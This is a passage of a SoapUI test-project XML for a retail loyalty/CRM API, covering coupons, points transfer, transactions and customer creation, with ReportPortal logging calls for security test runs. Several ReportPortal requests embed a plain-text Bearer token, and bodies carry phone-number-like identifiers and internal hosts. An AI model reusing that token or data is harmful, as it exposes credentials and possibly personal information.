            <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
            <con:authType>Global HTTP Settings</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters/>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="7bd5e296-824e-4279-98ff-8dada1ff92fa" wadlVersion="http://wadl.dev.java.net/2009/02" name="isCouponRedeemable" type="rest" definitionUrl="https" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache type="TEXT"/>
    <con:endpoints>
      <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
    </con:endpoints>
    <con:resource name="isredeemable" path="/v1.1/coupon/isredeemable" id="de8547f9-9386-4efc-9c1b-dfd3166e43ed">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>format</con:name>
          <con:value>json</con:value>
          <con:style>QUERY</con:style>
          <con:default>json</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>details</con:name>
          <con:value>true</con:value>
          <con:style>QUERY</con:style>
          <con:default>true</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>code</con:name>
          <con:value>{coupon_code}</con:value>
          <con:style>QUERY</con:style>
          <con:default>{coupon_code}</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>mobile</con:name>
          <con:value>{mobile}</con:value>
          <con:style>QUERY</con:style>
          <con:default>{mobile}</con:default>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="b60256fa-2b15-4f09-b4ae-5879f86d7367" method="GET">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="2065919b-04a9-42cd-b6be-b621d97e53d4" mediaType="application/json">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting>
          </con:settings>
          <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
          <con:request/>
          <con:credentials>
            <con:username>${#Project#auth_username}</con:username>
            <con:password>${#Project#auth_password}</con:password>
            <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
            <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
            <con:authType>Global HTTP Settings</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters/>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="216dc5d8-4532-4e16-8aeb-831bca39e6a2" wadlVersion="http://wadl.dev.java.net/2009/02" name="getCouponSeries" type="rest" definitionUrl="https" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache type="TEXT"/>
    <con:endpoints>
      <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
    </con:endpoints>
    <con:resource name="series" path="/v1.1/coupon/series" id="e058e844-1c81-4c0a-a43e-9b09bc11e8b9">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>format</con:name>
          <con:value>json</con:value>
          <con:style>QUERY</con:style>
          <con:default>json</con:default>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="ace9d9a8-eb6f-4a05-93c9-aeab31251bb9" method="GET">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="4f9fddd5-ff27-468f-9305-ddb2ae83c9ed" mediaType="application/json">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting>
          </con:settings>
          <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
          <con:request/>
          <con:originalUri>https://nightly.capillary.in/v1.1/coupon/series</con:originalUri>
          <con:credentials>
            <con:username>${#Project#auth_username}</con:username>
            <con:password>${#Project#auth_password}</con:password>
            <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
            <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
            <con:authType>Global HTTP Settings</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters/>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="2f59ebc7-7862-4705-9aa4-5f205643a0a9" wadlVersion="http://wadl.dev.java.net/2009/02" name="getCustomerCoupons" type="rest" definitionUrl="https" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache type="TEXT"/>
    <con:endpoints>
      <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
    </con:endpoints>
    <con:resource name="coupons" path="/v1.1/customer/coupons" id="cc3aad53-0998-4733-8201-36512ac5b31d">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>format</con:name>
          <con:value>json</con:value>
          <con:style>QUERY</con:style>
          <con:default>json</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>mobile</con:name>
          <con:value>{mobile}</con:value>
          <con:style>QUERY</con:style>
          <con:default>{mobile}</con:default>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="d2677551-7e84-4275-919c-5a8d19151251" method="GET">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="a83c3c0e-7af3-4d6d-b7d5-76c317dee5b5" mediaType="application/json">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting>
          </con:settings>
          <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
          <con:request/>
          <con:credentials>
            <con:username>${#Project#auth_username}</con:username>
            <con:password>${#Project#auth_password}</con:password>
            <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
            <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
            <con:authType>Global HTTP Settings</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters/>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="1d167895-41a8-4013-9475-73ed873bd3c3" wadlVersion="http://wadl.dev.java.net/2009/02" name="getCouponDetails" type="rest" definitionUrl="https" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache/>
    <con:endpoints>
      <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
    </con:endpoints>
    <con:resource name="get" path="/v1.1/coupon/get" id="d32d3221-3fbb-4a67-b286-63f03fe45387">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>format</con:name>
          <con:value>json</con:value>
          <con:style>QUERY</con:style>
          <con:default>json</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>code</con:name>
          <con:value>{code}</con:value>
          <con:style>QUERY</con:style>
          <con:default>{code}</con:default>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="52be3e16-8714-40c2-9998-1f35b6bdea81" method="GET">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="b20f21c7-d621-4e58-b18d-b146a4c66139" mediaType="application/json">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="content-type" value="application/json" xmlns="http://eviware.com/soapui/config"/></con:setting>
          </con:settings>
          <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
          <con:request/>
          <con:credentials>
            <con:username>${#Project#auth_username}</con:username>
            <con:password>${#Project#auth_password}</con:password>
            <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
            <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
            <con:authType>Global HTTP Settings</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters/>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="5d90c9b2-daf9-4655-a09e-994747cdb1f8" wadlVersion="http://wadl.dev.java.net/2009/02" name="isPointsTransferable" type="rest" definitionUrl="https" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache type="TEXT"/>
    <con:endpoints>
      <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
    </con:endpoints>
    <con:resource name="isTransferrable" path="/v2/points/isTransferrable" id="3ca0226e-f428-4441-a805-a91854c831dd">
      <con:settings/>
      <con:parameters/>
      <con:method name="Method 1" id="dfeed04d-66e9-4cc3-9eb9-d4a7141b8e6e" method="POST">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="0dcc0e21-afd7-4862-838c-ca8bcaeadc75" mediaType="application/json" postQueryString="false">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Content-type" value="application/json" xmlns="http://eviware.com/soapui/config"/></con:setting>
          </con:settings>
          <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
          <con:request>{
    "issueOtp": true,
    "pointsTobeTransferred": 1.1,
    "toCustomerIdentifier": {
        "type": "MOBILE",
        "value": "917709142209"
    },
    "fromCustomerIdentifier": {
        "type": "MOBILE",
        "value": "917332628259"
    }
}</con:request>
          <con:credentials>
            <con:username>${#Project#auth_username}</con:username>
            <con:password>${#Project#auth_password}</con:password>
            <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
            <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
            <con:authType>Global HTTP Settings</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters/>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="f9e0c80e-598d-49ef-98ac-f19bbcb4f1fd" wadlVersion="http://wadl.dev.java.net/2009/02" name="returnRegularTransaction" type="rest" definitionUrl="htts" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache type="TEXT"/>
    <con:endpoints>
      <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
    </con:endpoints>
    <con:resource name="add" path="/v1.1/transaction/add" id="1121e52b-c3e8-463f-b2c2-471c7de88da4">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>format</con:name>
          <con:value>json</con:value>
          <con:style>QUERY</con:style>
          <con:default>json</con:default>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="fb853c35-7bdf-448a-ab98-231c2b4a0fcf" method="POST">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="77cded7f-7736-4732-bd83-29e42c30f628" mediaType="application/json" postQueryString="false">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="content-type" value="application/json" xmlns="http://eviware.com/soapui/config"/></con:setting>
          </con:settings>
          <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
          <con:request>{
	"root": {
		"transaction": {
			"type": "return",
			"bill_client_id": "wd221123333",
			"customer": {
				"firstname": "Rati",
				"lastname": "Ranjan",
				"email": "{{mobile1}}@mil.com",
				"mobile": "{{mobile1}}",
				"external_id": "X{{mobile1}}"
			},
			"transaction_number": "7u78118",
			"amount": "1000",
			"notes": "bill with note",
			"line_items": {
				"line_item": {
					"extended_fields": {
						"field": [{
								"name": "MetalRate",
								"value": 23
							},
							{
								"name": "MetalWeight",
								"value": 200
							}
						]
					},
					"serial": "0",
					"item_code": "t122",
					"description": "afvdfvd",
					"qty": "3",
					"rate": "1000",
					"value": "3000",
					"discount_value": "100",
					"amount": "8888",
					"cashier_id": "cash1233"
				}
			},
			"extended_fields": {
				"field": [{
						"name": "CentralGST",
						"value": 6
					},
					{
						"name": "StateGST",
						"value": 6
					}
				]
			},
			"payment_details": {
				"payment": {
					"mode": "CASH",
					"value": "100"
				}
			},
			"custom_fields": {
				"field": {
					"-name": "paymentmode",
					"value": "现金"
				}
			},
			"associate_details": {
				"code": "223232",
				"name": "afdf4r3"
			},
			"referral_code": "efef34343",
			"return_type": "FULL"
		}
	}
}</con:request>
          <con:credentials>
            <con:username>${#Project#auth_username}</con:username>
            <con:password>${#Project#auth_password}</con:password>
            <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
            <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
            <con:authType>Global HTTP Settings</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters/>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="a2f3d0d0-8309-4edf-a0bd-969e38e4bb55" wadlVersion="http://wadl.dev.java.net/2009/02" name="updateOrgConfig" type="rest" definitionUrl="https" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache type="TEXT"/>
    <con:endpoints>
      <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
    </con:endpoints>
    <con:resource name="configs" path="/{version}/organization/configs" id="72004983-e818-4dff-9903-7a8ef1da5c14">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>version</con:name>
          <con:value>version</con:value>
          <con:style>TEMPLATE</con:style>
          <con:default>version</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>format</con:name>
          <con:value>xml</con:value>
          <con:style>QUERY</con:style>
          <con:default>xml</con:default>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="3828eaaf-55d7-41c7-9c90-8277cd469974" method="POST">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="9ae77cbf-a340-43f2-9a3b-e6cd9213c773" mediaType="application/xml" postQueryString="false">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting>
          </con:settings>
          <con:endpoint>- no endpoint set -</con:endpoint>
          <con:request><![CDATA[<root>
     <organization>
             <configs>
                     <config>
                             <name>CONF_LOYALTY_POINTS_REDEMPTION_LIFETIME_PURCHASE_MIN</name>
                             <scope>ORG</scope>
                             <value>0</value>
                            <entity_id>null</entity_id>
                     </config>
             </configs>
     </organization>
</root>]]></con:request>
          <con:credentials>
            <con:username>${#Project#auth_username}</con:username>
            <con:password>${#Project#auth_password}</con:password>
            <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
            <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
            <con:authType>Global HTTP Settings</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters>
            <entry key="version" value="v1.1" xmlns="http://eviware.com/soapui/config"/>
          </con:parameters>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="58906dd6-573e-4ca1-97d8-6660624d4ecd" wadlVersion="http://wadl.dev.java.net/2009/02" name="triggerCustomEvent" type="rest" definitionUrl="https" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache type="TEXT"/>
    <con:endpoints>
      <con:endpoint>https://${#Project#custom_events_webhook}</con:endpoint>
    </con:endpoints>
    <con:resource name="1b35496e-4126-4242-be3e-20f624766b67" path="" id="298f4f66-d3fe-4f25-bbf4-b8bbcf2e3706">
      <con:settings/>
      <con:parameters/>
      <con:method name="Method 1" id="bc2ab0db-9295-4bdf-ae1e-788c2302c95b" method="POST">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="f773dd65-36e5-4368-91df-2c4c620e83d1" mediaType="application/json" postQueryString="false">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="content-type" value="application/json" xmlns="http://eviware.com/soapui/config"/></con:setting>
          </con:settings>
          <con:endpoint>https://${#Project#custom_events_webhook}</con:endpoint>
          <con:request>{"Mobile":"918733645468",
"Name":"stringxxx",
"Till":"alpha_endtoend_test",
"event_name":"AlphaEndToEnd"}</con:request>
          <con:originalUri>https://8mo7zxjtj0.execute-api.us-east-1.amazonaws.com/onenightly/webhooks/1b35496e-4126-4242-be3e-20f624766b67</con:originalUri>
          <con:credentials>
            <con:authType>No Authorization</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters/>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="a691791f-99a2-4ace-9f16-fb0574a1ef08" wadlVersion="http://wadl.dev.java.net/2009/02" name="rp" type="rest" definitionUrl="reportPortal" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache/>
    <con:endpoints/>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="804e1d35-c0ce-40b6-9c5a-a0a6a7d7f735" wadlVersion="http://wadl.dev.java.net/2009/02" name="ReportPortal" type="rest" definitionUrl="https" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache type="TEXT"/>
    <con:endpoints>
      <con:endpoint>http://qareportportal.capillary.in</con:endpoint>
    </con:endpoints>
    <con:resource name="Start Launch" path="/api/v1/superadmin_personal/launch" id="7dfaecaf-f157-4518-a01a-659f76fc2b18">
      <con:settings/>
      <con:parameters/>
      <con:method name="Method 1" id="4c375672-2e69-4852-8fdc-c9f77f6e7052" method="POST">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="240e4a6f-472b-4bcb-8174-58f0c32192bc" mediaType="application/json" postQueryString="false">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment xmlns:con="http://eviware.com/soapui/config">
  &lt;con:entry key="Authorization" value="Bearer 3c24e31f-e667-4ecd-8b80-91b42abccc8f"/>
  &lt;con:entry key="Content-Type" value="application/json"/>
&lt;/xml-fragment></con:setting>
          </con:settings>
          <con:endpoint>http://qareportportal.capillary.in</con:endpoint>
          <con:request>{
   "name":"Demo_SecurityTestLaunch",
   "description":"My first launch for Security Tests",
   "startTime":"1613057703000",
   "mode":"DEFAULT",
   "attributes":[
      {
         "key":"env",
         "value":"nightly"
      },
      {
         "value":"test"
      }
   ]
}</con:request>
          <con:originalUri>http://qareportportal.capillary.in/api/v1/superadmin_personal/launch</con:originalUri>
          <con:credentials>
            <con:authType>No Authorization</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters/>
        </con:request>
      </con:method>
    </con:resource>
    <con:resource name="StartTestSuite" path="/api/v1/superadmin_personal/item" id="5b0813cd-0dde-4305-9221-74c4db6a9e8b">
      <con:settings/>
      <con:parameters/>
      <con:method name="Method 1" id="2ff59c6b-328b-488b-a023-fee0dfc26d3b" method="POST">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="3ee5b2d3-d2de-4b83-ad07-14aa3a57b2e6" mediaType="application/json" postQueryString="false">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment xmlns:con="http://eviware.com/soapui/config">
  &lt;con:entry key="Authorization" value="Bearer 3c24e31f-e667-4ecd-8b80-91b42abccc8f"/>
  &lt;con:entry key="Content-Type" value="application/json"/>
&lt;/xml-fragment></con:setting>
          </con:settings>
          <con:endpoint>http://qareportportal.capillary.in</con:endpoint>
          <con:request>{
   "name":"SecurityTestSuits",
   "startTime":"1613057703000",
   "type":"suite",
   "launchUuid":"235ac51c-fb22-4202-b16c-f2f1adb22ffa",
   "description":"Security Test Suits"
}</con:request>
          <con:originalUri>http://qareportportal.capillary.in/api/v1/superadmin_personal/item</con:originalUri>
          <con:credentials>
            <con:authType>No Authorization</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters/>
        </con:request>
      </con:method>
    </con:resource>
    <con:resource name="startTestCase" path="/api/v1/superadmin_personal/item/{itemId}" id="78064d81-cae0-4d7b-8d31-3d57d3ef8692">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>itemId</con:name>
          <con:value>itemId</con:value>
          <con:style>TEMPLATE</con:style>
          <con:default>itemId</con:default>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="fa3ba7a9-bf74-4c0b-8862-e2e5c1d9c52e" method="POST">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="bf804461-2728-4247-b175-2cd2dcdbb747" mediaType="application/json" postQueryString="false">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Authorization" value="Bearer 3c24e31f-e667-4ecd-8b80-91b42abccc8f" xmlns="http://eviware.com/soapui/config"/></con:setting>
          </con:settings>
          <con:endpoint>http://qareportportal.capillary.in</con:endpoint>
          <con:request>{
   "name":"CustomerAddSecurityTest",
   "startTime":"1613057703000",
   "type":"test",
   "launchUuid":"235ac51c-fb22-4202-b16c-f2f1adb22ffa",
   "description":"CustomerAddSecurityTest"
}</con:request>
          <con:originalUri>http://qareportportal.capillary.in/api/v1/superadmin_personal/item/auto%3Aeee9059fa62091ec6e87f2d2f8937ba0</con:originalUri>
          <con:credentials>
            <con:authType>No Authorization</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters>
            <entry key="itemId" value="ff49398f-0e12-40d6-a307-afa13f4ce285" xmlns="http://eviware.com/soapui/config"/>
          </con:parameters>
        </con:request>
      </con:method>
    </con:resource>
    <con:resource name="startTestStep" path="/api/v1/superadmin_personal/item/{itemId}" id="78064d81-cae0-4d7b-8d31-3d57d3ef8692">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>itemId</con:name>
          <con:value>itemId</con:value>
          <con:style>TEMPLATE</con:style>
          <con:default>itemId</con:default>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="fa3ba7a9-bf74-4c0b-8862-e2e5c1d9c52e" method="POST">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="bf804461-2728-4247-b175-2cd2dcdbb747" mediaType="application/json" postQueryString="false">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Authorization" value="Bearer 3c24e31f-e667-4ecd-8b80-91b42abccc8f" xmlns="http://eviware.com/soapui/config"/></con:setting>
          </con:settings>
          <con:endpoint>http://qareportportal.capillary.in</con:endpoint>
          <con:request>{
   "name":"CustomerAddFuzzyScan",
   "startTime":"1613029822000",
   "type":"step",
   "launchUuid":"831de321-d599-4758-9d92-ceac899bf0da",
   "description":"CustomerAddFuzzyScan"
}</con:request>
          <con:originalUri>http://qareportportal.capillary.in/api/v1/superadmin_personal/item/auto%3Aeee9059fa62091ec6e87f2d2f8937ba0</con:originalUri>
          <con:credentials>
            <con:authType>No Authorization</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters>
            <entry key="itemId" value="62940bb8-23a6-4a38-997f-73f72e3893fd" xmlns="http://eviware.com/soapui/config"/>
          </con:parameters>
        </con:request>
      </con:method>
    </con:resource>
    <con:resource name="addLog" path="/api/v1/superadmin_personal/log" id="78064d81-cae0-4d7b-8d31-3d57d3ef8692">
      <con:settings/>
      <con:parameters/>
      <con:method name="Method 1" id="fa3ba7a9-bf74-4c0b-8862-e2e5c1d9c52e" method="POST">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="bf804461-2728-4247-b175-2cd2dcdbb747" mediaType="application/json" postQueryString="false">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Authorization" value="Bearer 3c24e31f-e667-4ecd-8b80-91b42abccc8f" xmlns="http://eviware.com/soapui/config"/></con:setting>
          </con:settings>
          <con:endpoint>http://qareportportal.capillary.in</con:endpoint>
          <con:request>{
   "launchUuid":"831de321-d599-4758-9d92-ceac899bf0da",
   "itemUuid":"8a2b667e-6ce2-4405-870e-db8713b377b5",
   "time":"1613029822000",
   "message":"",
   "level":"info"
}</con:request>
          <con:originalUri>http://qareportportal.capillary.in/api/v1/superadmin_personal/item/auto%3Aeee9059fa62091ec6e87f2d2f8937ba0</con:originalUri>
          <con:credentials>
            <con:authType>No Authorization</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters/>
          <con:parameterOrder/>
        </con:request>
      </con:method>
    </con:resource>
    <con:resource name="closeItem" path="/api/v1/superadmin_personal/item/{itemID}" id="410182c2-0558-42dc-8447-4a674ada2d4e">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>itemID</con:name>
          <con:value/>
          <con:style>TEMPLATE</con:style>
          <con:default/>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="6d890730-06d0-45e1-9e63-aa259675a123" method="PUT">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="919c021c-cfaa-4322-82fb-4ee4d3039cbd" mediaType="application/json" postQueryString="false">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Authorization" value="Bearer 3c24e31f-e667-4ecd-8b80-91b42abccc8f" xmlns="http://eviware.com/soapui/config"/></con:setting>
          </con:settings>
          <con:endpoint>http://qareportportal.capillary.in</con:endpoint>
          <con:request>{
  "endTime": "1574423239000",
  "status": "failed",
  "launchUuid": "96d1bc02-6a3f-451e-b706-719149d51ce4"
}</con:request>
          <con:credentials>
            <con:authType>No Authorization</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters>
            <entry key="itemID" value="" xmlns="http://eviware.com/soapui/config"/>
          </con:parameters>
          <con:parameterOrder>
            <con:entry>itemID</con:entry>
          </con:parameterOrder>
        </con:request>
      </con:method>
    </con:resource>
    <con:resource name="closeLaunch" path="/api/v1/superadmin_personal/launch/{launchID}/finish" id="7300943f-09a5-458d-a388-adc5c3c3308f">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>launchID</con:name>
          <con:value>launchID</con:value>
          <con:style>TEMPLATE</con:style>
          <con:default>launchID</con:default>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="29aa468a-e1d6-4973-a7a7-f31fc4c01954" method="PUT">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="d29ecd9a-c8e5-4630-9271-641335e91b93" mediaType="application/json" postQueryString="false">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Authorization" value="Bearer 3c24e31f-e667-4ecd-8b80-91b42abccc8f" xmlns="http://eviware.com/soapui/config"/></con:setting>
          </con:settings>
          <con:endpoint>http://qareportportal.capillary.in</con:endpoint>
          <con:request>{
  "endTime": "1574423255000"
}</con:request>
          <con:credentials>
            <con:authType>No Authorization</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters>
            <entry key="launchID" value="launchID" xmlns="http://eviware.com/soapui/config"/>
          </con:parameters>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="5ae7aada-fea8-4fbc-9f70-063aa3b0d79c" wadlVersion="http://wadl.dev.java.net/2009/02" name="addCustomerV2" type="rest" definitionUrl="https" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache type="TEXT"/>
    <con:endpoints/>
    <con:resource name="customers" path="/v2/customers" id="5a39acf4-e627-4165-9805-b8e227590b31">
      <con:settings/>
      <con:parameters/>
      <con:method name="Method 1" id="26a7759f-4d64-4075-a7d0-03b99b4873d3" method="POST">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="fd4f6c5f-ee66-46fb-8dd5-295d8bf5ada6" mediaType="application/json" postQueryString="false">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting>
          </con:settings>
          <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
          <con:request>{
  "profiles": [{
    "firstName": "Fname_test",
    "lastName": "Lname_test",
    "identifiers": [{
      "type": "mobile",
      "value": "9765764354"
    },{
      "type": "cuid",
      "value": "cuid_9765764354"
    },
    {
      "type": "unionId",
      "value": "unionId_9765764354"
    },
    {
      "type": "email",
      "value": "9765764354@gmail.com"
    },
    {
      "type": "externalId",
      "value": "x9765764354"
    }
   ],
    "commChannels": [{
      "type": "mobile",
      "value": "9765764354",
      "primary": true,
      "verified": true
    }, {
      "type": "email",
      "value": "9765764354@mail.com",
      "primary": true,
      "verified": true
    },{
        "type": "ios",
        "value": "9765764354",
        "primary":true,
        "verified":true
    }],
    "source": "INSTORE",
    "accountId": "~71680076"
  }],
  "loyaltyInfo": {
    "loyaltyType": "loyalty"
  },
  "referralCode": ""
}</con:request>
          <con:originalUri>https://crm-nightly-new.cc.capillarytech.com/v2/customers</con:originalUri>
          <con:credentials>
            <con:username>${#Project#auth_username}</con:username>
            <con:password>${#Project#auth_password}</con:password>
            <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
            <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
            <con:authType>Global HTTP Settings</con:authType>
          </con:credentials>
